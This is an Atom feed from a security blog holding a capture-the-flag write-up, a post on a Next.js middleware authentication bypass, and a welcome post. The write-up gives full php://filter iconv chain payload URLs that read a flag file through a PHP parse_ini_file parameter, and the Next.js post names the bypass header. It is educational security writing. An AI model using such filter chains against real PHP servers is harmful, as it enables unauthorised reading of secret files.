<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2025-04-04T07:45:21+02:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">The DarkForge Labs Blog</title><subtitle>Welcome to the DarkForge Labs blog! We explore topics that  intrigue us, from security research to upcoming events.  Enjoy your stay! – The DarkForge Labs Team</subtitle><entry><title type="html">Poem CTF Solution, the PHP Filter Way</title><link href="http://0.0.0.0:4000/ctf/darkforge/phpfilter/2025/04/04/CTF-Poem.html" rel="alternate" type="text/html" title="Poem CTF Solution, the PHP Filter Way" /><published>2025-04-04T06:00:00+02:00</published><updated>2025-04-04T06:00:00+02:00</updated><id>http://0.0.0.0:4000/ctf/darkforge/phpfilter/2025/04/04/CTF-Poem</id><content type="html" xml:base="http://0.0.0.0:4000/ctf/darkforge/phpfilter/2025/04/04/CTF-Poem.html"><![CDATA[<h1 id="darkforge-labs-first-ctf">DarkForge Labs’ First CTF</h1>

<p>First off, huge congratulations to everyone who completed the challenge — and a special shoutout to <a href="https://x.com/et3rnos">et3rnos</a>, the first to solve it and our official winner!</p>

<p>This CTF was inspired by the article <a href="https://swarm.ptsecurity.com/impossible-xxe-in-php/"><em>Impossible XXE in PHP</em></a> by Aleksandr Zhurnakov. If you haven’t read it yet, you’re missing out.</p>

<h2 id="the-challenge">The Challenge</h2>

<p><img src="/assets/images/8547585d23cb272c9c59d16187874544430ce34b.png" alt="The Challenge" /></p>

<p>The challenge was hosted at <a href="https://ctf.darkfor.ge/">https://ctf.darkfor.ge</a> with the source available on our <a href="https://github.com/darkforge-labs/ctf-poem-web">GitHub</a>.</p>

<p>Digging into <a href="https://github.com/darkforge-labs/ctf-poem-web/blob/main/index.php"><code class="language-plaintext highlighter-rouge">index.php</code></a>, we find three interesting things:</p>

<ul>
  <li>The file parses a user-controlled parameter using:<br />
<code class="language-plaintext highlighter-rouge">parse_ini_file($poem_file, true);</code></li>
  <li>The <code class="language-plaintext highlighter-rouge">$poem_file</code> variable is controllable via the <code class="language-plaintext highlighter-rouge">poem_file</code> GET parameter:<br />
<code class="language-plaintext highlighter-rouge">$poem_file = $_GET['poem_file'] ?? '/var/www/html/poem.ini';</code></li>
  <li>The INI key it looks for is <code class="language-plaintext highlighter-rouge">POEM</code>:<br />
<code class="language-plaintext highlighter-rouge">$config['POEM']</code><br />
<em>(Note: INI keys are <strong>case sensitive</strong>.)</em></li>
</ul>

<p>From the <a href="https://github.com/darkforge-labs/ctf-poem-web/blob/main/Dockerfile"><code class="language-plaintext highlighter-rouge">Dockerfile</code></a>, we learn the flag is stored at <code class="language-plaintext highlighter-rouge">/var/secret/flag.txt</code>.</p>

<h2 id="solution">Solution</h2>

<p>Your first instinct might be to try this:<br />
<a href="https://ctf.darkfor.ge/?poem_file=/var/secret/flag.txt">https://ctf.darkfor.ge/?poem_file=/var/secret/flag.txt</a></p>

<p>But that won’t work. The flag file doesn’t contain INI-formatted content, and <code class="language-plaintext highlighter-rouge">parse_ini_file()</code> expects a valid format like:</p>

<div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="py">POEM</span> <span class="p">=</span> <span class="s">FLAG_VALUE</span>
</code></pre></div></div>

<p>So, the trick is to <strong>prepend</strong> the necessary INI key to the flag content.</p>

<h2 id="dead-ends">Dead Ends</h2>

<p>If you’re familiar with the modern <a href="https://github.com/ambionics/wrapwrap">wrapwrap</a> technique by <a href="https://x.com/cfreal_">Charles Fol</a>, you might try using that. However, due to server constraints on URL length, you’ll hit a “Requested URI Too Long” error.</p>

<p><img src="/assets/images/6b62b65e86a4665f74c7ca862328fc1cc098ecda.png" alt="URI too long error" /></p>

<h2 id="filters-to-the-rescue">Filters to the Rescue</h2>

<p>It all starts with this legendary post by <a href="https://x.com/gynvael">Gynvael</a> in 2018:<br />
<a href="https://gynvael.coldwind.pl/?id=671">Surprising CTF task solution using php://filter</a></p>

<p>Shortly after this post, <a href="https://x.com/loknop">lolknop</a> took it further with a custom payload generator you can find in this <a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">Gist</a>.</p>

<p>This is perfect — we can use it to prepend the line <code class="language-plaintext highlighter-rouge">POEM = </code> to the flag content, making it parsable by <code class="language-plaintext highlighter-rouge">parse_ini_file()</code>.</p>

<p>But… there’s a slight snag. Both <code class="language-plaintext highlighter-rouge">POEM =</code> and its base64 form <code class="language-plaintext highlighter-rouge">UE9FTSA9</code> contain characters not supported by lolknop’s script. The workaround? Use a <strong>tab</strong> and remove the space before the <code class="language-plaintext highlighter-rouge">=</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\tPOEM=
</code></pre></div></div>

<p>Which base64-encodes to: <code class="language-plaintext highlighter-rouge">CVBPRU09</code> — a string with characters fully supported by the Gist tooling. Excellent.</p>

<p>This allows us to build a monster filter chain like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php://filter/.../resource=/var/secret/flag.txt
</code></pre></div></div>

<p><em>(Note: Click the link for the full URL)</em></p>

<p><a href="https://ctf.darkfor.ge/?poem_file=php://filter/convert.iconv.UTF8.CSISO2022KR%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.ISO2022KR.UTF16%7cconvert.iconv.ISO6937.JOHAB%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.ISO2022KR.UTF16%7cconvert.iconv.UCS-2LE.UCS-2BE%7cconvert.iconv.TCVN.UCS2%7cconvert.iconv.1046.UCS2%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.ISO2022KR.UTF16%7cconvert.iconv.CP1133.IBM932%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.UTF16LE%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.UTF16.EUCTW%7cconvert.iconv.MAC.UCS2%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.ISO2022KR.UTF16%7cconvert.iconv.UCS-2LE.UCS-2BE%7cconvert.iconv.TCVN.UCS2%7cconvert.iconv.857.SHIFTJISX0213%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.UTF16LE%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.UTF16.EUCTW%7cconvert.iconv.CP1256.UCS2%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.ISO2022KR.UTF16%7cconvert.iconv.UCS-2LE.UCS-2BE%7cconvert.iconv.TCVN.UCS2%7cconvert.iconv.851.BIG5%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.base64-decode/resource=/var/secret/flag.txt">Payload link https://ctf.darkfor.ge/?poem_file=php://filter/convert.iconv.UTF8…|convert.base64-decode/resource=/var/secret/flag.txt</a></p>

<h2 id="easier-payload-generation">Easier Payload Generation</h2>

<p>For a much cleaner experience, use the <a href="https://github.com/synacktiv/php_filter_chain_generator">PHP Filter Chain Generator</a> by <a href="https://x.com/_remsio_">Rémi Matasse</a> of Synacktiv. It already maps most ASCII character to their supported encodings.</p>

<p>Just run:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python php_filter_chain_generator.py <span class="nt">--chain</span> <span class="s1">'POEM ='</span>
</code></pre></div></div>

<p>Then replace <code class="language-plaintext highlighter-rouge">resource=</code> with your target file (<code class="language-plaintext highlighter-rouge">/var/secret/flag.txt</code>), and voilà, payload done.</p>

<p><em>(Note: Click the link for the full URL)</em></p>

<p><a href="https://ctf.darkfor.ge/?poem_file=php://filter/convert.iconv.UTF8.CSISO2022KR%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.CSIBM1161.UNICODE%7cconvert.iconv.ISO-IR-156.JOHAB%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.8859_3.UTF16%7cconvert.iconv.863.SHIFT_JISX0213%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.INIS.UTF16%7cconvert.iconv.CSIBM1133.IBM943%7cconvert.iconv.GBK.SJIS%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.L6.UNICODE%7cconvert.iconv.CP1282.ISO-IR-90%7cconvert.iconv.CSA_T500.L4%7cconvert.iconv.ISO_8859-2.ISO-IR-103%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.L5.UTF-32%7cconvert.iconv.ISO88594.GB13000%7cconvert.iconv.CP950.SHIFT_JISX0213%7cconvert.iconv.UHC.JOHAB%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.CSIBM1161.UNICODE%7cconvert.iconv.ISO-IR-156.JOHAB%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.IBM860.UTF16%7cconvert.iconv.ISO-IR-143.ISO2022CNEXT%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.INIS.UTF16%7cconvert.iconv.CSIBM1133.IBM943%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.base64-decode/resource=/var/secret/flag.txt">https://ctf.darkfor.ge/?poem_file=php://filter/convert.iconv…|convert.base64-encode|…|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/var/secret/flag.txt</a></p>

<p><img src="/assets/images/3cc56575fc80a023f712eadc961786902d7b0d89.png" alt="Flag Retrieved" /></p>

<p>For deeper understanding, I highly recommend reading their full post:<br />
<a href="https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it"><em>PHP Filters Chain: What is it and how to use it</em></a></p>

<p>You can also explore <a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">PHP_INCLUDE_TO_SHELL_CHAR_DICT</a> by <a href="https://github.com/wupco">Wupco</a> for fuzzing and payload crafting.</p>

<h2 id="final-thoughts">Final Thoughts</h2>

<p>This challenge was all about exploring edge-case behavior in PHP’s obscure corners and the community’s creativity in weaponizing those quirks. The linked articles are truly mind-bending and absolutely worth a read.</p>

<p>Big thanks to everyone who played, and stay tuned, the <a href="https://darkforge.io">DarkForge</a> team has a lot more coming your way.</p>]]></content><author><name></name></author><category term="CTF" /><category term="DarkForge" /><category term="PHPFilter" /><summary type="html"><![CDATA[DarkForge Labs’ First CTF]]></summary></entry><entry><title type="html">Authentication at the Edge</title><link href="http://0.0.0.0:4000/next.js/middleware/authentication/2025/04/01/Authentication-At-The-Edge.html" rel="alternate" type="text/html" title="Authentication at the Edge" /><published>2025-04-01T09:00:00+02:00</published><updated>2025-04-01T09:00:00+02:00</updated><id>http://0.0.0.0:4000/next.js/middleware/authentication/2025/04/01/Authentication-At-The-Edge</id><content type="html" xml:base="http://0.0.0.0:4000/next.js/middleware/authentication/2025/04/01/Authentication-At-The-Edge.html"><![CDATA[<h1 id="cve-2025-29927">CVE-2025-29927</h1>

<p>When <a href="https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware">CVE-2025-29927</a> dropped, it lit up the infosec world. An authentication bypass in Next.js middleware raised urgent questions not just about the vulnerability itself but about architectural choices.</p>

<p><em>Should we be enforcing authentication in the middleware?</em></p>

<p>It’s a question that’s polarized developers and security engineers alike. <a href="https://x.com/moopinger/status/1906281539815579790">Our own X poll came back split almost exactly down the middle.</a></p>

<p>But after digging into the excellent write-ups from <a href="https://www.neoxs.me/blog/critical-nextjs-middleware-vulnerability-cve-2025-29927-authentication-bypass">neox</a>, <a href="https://slcyber.io/assetnote-security-research-center/doing-the-due-diligence-analysing-the-next-js-middleware-bypass-cve-2025-29927">Assetnote</a>, <a href="https://jfrog.com/blog/cve-2025-29927-next-js-authorization-bypass/">JFrog</a>, and <a href="https://www.rapid7.com/blog/post/2025/03/25/etr-notable-vulnerabilities-in-next-js-cve-2025-29927/">Rapid7</a> — we realized something:</p>

<p>We’ve been asking the wrong question.</p>

<h2 id="the-real-question-should-all-your-authentication-run-in-nextjs-middleware">The Real Question: Should <em>All</em> Your Authentication Run in <em>Next.js</em> Middleware?</h2>

<p>That’s the actual crux. And the answer is a resounding <span class="underline">no</span>.</p>

<p>Middleware in Next.js, especially in the App Router, runs in an <strong>edge runtime</strong>. That means it operates in a different environment than your backend or API routes. It’s fast, global, and lightweight. But it also has real limitations:</p>

<ul>
  <li><a href="https://nextjs.org/docs/app/building-your-application/rendering/edge-and-nodejs-runtimes">The edge runtime runs on a separate more limited Node runtime</a></li>
  <li><a href="https://clerk.com/blog/what-is-middleware-in-nextjs">Limited access to full request bodies</a></li>
</ul>

<p>Compare this to <code class="language-plaintext highlighter-rouge">Express.js</code> middleware, which runs in a Node.js server with full control over the request lifecycle. Same word <em>middleware</em> but completely different realities.</p>

<p>That distinction matters. Because when you put critical auth logic in Next.js edge middleware, you’re betting your security on a layer that wasn’t built for that burden.</p>

<p>Even <strong>Vercel</strong> says as much in their <a href="https://vercel.com/blog/postmortem-on-next-js-middleware-bypass">postmortem</a>:</p>

<blockquote>
  <p>“We do not recommend Middleware to be the sole method of protecting routes in your application”</p>
</blockquote>

<h2 id="so-what-is-edge-based-middleware-good-for">So What Is Edge Based Middleware Good For?</h2>

<p>Used correctly, Next.js middleware can still be a powerful tool — especially for <strong>coarse-grained access control</strong>. Think of it like the lobby guard, not the vault door.</p>

<ul>
  <li><strong>Use it to block unauthenticated users</strong> from public routes</li>
  <li><strong>Redirect users to login</strong> if they’re missing a session</li>
  <li><strong>Apply basic tenant-aware routing</strong></li>
</ul>

<p>But the real enforcement should happen deeper:</p>

<ul>
  <li><strong>Don’t check roles or permissions here</strong></li>
  <li><strong>Don’t make critical auth decisions</strong> based only on this layer</li>
</ul>

<p>Instead, <strong>put your fine-grained logic</strong> on the server side — RBAC, ABAC, tenant isolation — <strong>inside your API routes or backend logic</strong>.</p>

<h2 id="lessons-from-cve-2025-29927">Lessons from CVE-2025-29927</h2>

<p>The flaw that triggered this debate didn’t involve tricky encoding or exotic Unicode behavior to bypass route matches. It was much simpler: by crafting a request with a specific HTTP header (<code class="language-plaintext highlighter-rouge">x-middleware-subrequest</code>), attackers could trick the server into skipping middleware entirely — and bypass authentication logic that only lived there.</p>

<p>It’s a classic case of trusting the wrong layer.</p>

<blockquote>
  <p><strong>If one bypass breaks your security, you didn’t have security. You had hope.</strong></p>
</blockquote>

<p>Here’s how to build for reality:</p>

<ul>
  <li><strong>Defend in depth</strong> — don’t make any single layer your only layer.</li>
  <li><strong>Authorize where it counts</strong> — at the point of data access, in your APIs.</li>
</ul>

<h2 id="final-thoughts">Final Thoughts</h2>

<p>CVE-2025-29927 isn’t the first middleware bypass — and it likely won’t be the last. That doesn’t mean middleware auth in Next.js is useless. Far from it.</p>

<p>Edge-based middleware is still a great place for coarse-grained controls. It can improve UX. It can help performance. It can offload basic gating logic.</p>

<p>But <span class="underline">it can’t be your only line of defense.</span></p>

<p>Use edge middleware wisely, as a first-pass filter, not your final gatekeeper. Build layers. Validate everywhere. And expect failure.</p>

<p>Because someone out there is already crafting the next bypass.</p>]]></content><author><name></name></author><category term="Next.js" /><category term="middleware" /><category term="authentication" /><summary type="html"><![CDATA[CVE-2025-29927]]></summary></entry><entry><title type="html">Hello World.</title><link href="http://0.0.0.0:4000/first/introduction/2025/03/28/Welcome-To-The-Blog.html" rel="alternate" type="text/html" title="Hello World." /><published>2025-03-28T10:00:00+02:00</published><updated>2025-03-28T10:00:00+02:00</updated><id>http://0.0.0.0:4000/first/introduction/2025/03/28/Welcome-To-The-Blog</id><content type="html" xml:base="http://0.0.0.0:4000/first/introduction/2025/03/28/Welcome-To-The-Blog.html"><![CDATA[<h1 id="welcome-to-darkforge-labs">Welcome to DarkForge Labs</h1>

<p>We’re a team of security engineers, hackers, and builders obsessed with solving problems in cybersecurity. At DarkForge Labs, we don’t just find threats, we dismantle them.</p>

<p>This blog is where we’ll share sharp, technical insights, real-world exploit breakdowns, research deep dives, and a behind-the-scenes look at how we defend the edge.</p>

<p>Whether you’re red team, blue team, or somewhere in between—pull up a chair. It’s about to get interesting.</p>

<p>Stay sharp.</p>

<p>– DarkForge Labs</p>]]></content><author><name></name></author><category term="first" /><category term="introduction" /><summary type="html"><![CDATA[Welcome to DarkForge Labs]]></summary></entry></feed>